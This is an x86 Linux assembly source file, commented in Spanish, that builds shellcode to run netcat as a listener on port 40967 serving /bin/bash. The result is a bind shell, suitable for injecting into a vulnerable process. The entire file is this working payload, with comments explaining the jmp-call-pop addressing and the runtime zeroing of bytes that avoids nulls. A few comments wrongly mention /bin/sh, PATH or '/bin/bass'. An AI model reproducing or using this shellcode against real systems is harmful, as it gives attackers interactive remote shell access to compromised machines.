;;; Mario Arturo Perez Rangel
;;; 25 - 03 -2017

;;; shell-rem.asm es el codigo ensamblador para conseguir el shellcode
;;; necesario para ejecutar un netcat que abra una shell. Para conseguirlo
;;; se define la siguiente cadena
;;; 
;;; /bin/ncN-lvvpN40967N-eN/bin/bassNXXXXXXXXXXXXXXXXXXXXYYYYTERM=linuxNXXXXYYYY
	
;;; en donde cada N sera substuida con un cero mediante la asignacion
;;; del registro AL en cero aplicando un XOR con el mismo.
;;; 
;;; Los grupos de Y's corresponden a un dword y simbolizan el final
;;; de un arreglo de apuntadores a cadenas, cada una de ellas
;;; terminadas con un valor cero, por ello se cambian las N's por
;;; el valor 0.
;;; 
;;; Los grupos de X's van de cuatro en cuatro y corresponden a la
;;; direccion de memoria donde empiezan cada una de las cadenas del\
;;; arreglo de apuntadores a cadena, como esta especificado en la
;;; llamada de sistema execve.
	
	global _start
	section .text

_start:
	jmp dir_cadena
codigo:
	pop esi			;almacena en el registro ESI,
				;el valor inicial de la pila

	xor eax,eax	    	;EAX=0
	mov byte[esi+7],al	;Fin de cadena de '/bin/nc'
	mov byte[esi+13],al	;Fin de cadena de '-lvvp'
	mov byte[esi+19],al	;Fin de cadena de '40967'
	mov byte[esi+22],al	;Fin de cadena de '-e'
	mov byte[esi+32],al	;Fin de cadena de '/bin/bash'
	mov dword[esi+53],eax	;Fin del arreglo de apuntadores a cadena
				;(2do parametro de la syscall execve)
	
	mov byte[esi+67],al	;Fin de cadena de 'TERM=linux'
	mov dword[esi+72],eax	;Fin del arreglo de apuntadores a cadena
				;(3er parametro de la syscall execve)

	lea ebx,[esi]		;Guarda la direccion del primer
				;  parametro (/bin/sh)
	mov [esi+33],ebx	;Guarda la direccion del segundo
	lea ebx,[esi+8]		;  parametro (-lvvp)
	mov [esi+37],ebx	;Guarda la direccion del tercer
	lea ebx,[esi+14]	;  parametro (40967)
	mov [esi+41],ebx	;Guarda la direccion del cuarto
	lea ebx,[esi+20]	;  parametro (-e)
	mov [esi+45],ebx	;Guarda la direccion del quinto
	lea ebx,[esi+23]	;  parametro (/bin/sh)
	mov [esi+49],ebx

	lea ebx,[esi+57]	;Guarda la direccion de al primer
	mov [esi+68],ebx	;  variable de ambiente (PATH)

	
	lea ebx,[esi]
	lea ecx,[esi+33]	;ECX tiene el arreglo de parametros
	lea edx,[esi+68]	;EDX tiene el arreglo de variables de ambiente
	mov al,0xb		;syscall execve
	int 0x80

	mov al,0x1		;syscall exit
	xor ebx,ebx		;valor de retorno cero
	int 80h
	
dir_cadena:	
	call codigo		;guarda la direccion inicial de
				;la cadena en la pila
	db '/bin/ncN-lvvpN40967N-eN/bin/bashNXXXXXXXXXXXXXXXXXXXXYYYYTERM=linuxNXXXXYYYY'
	
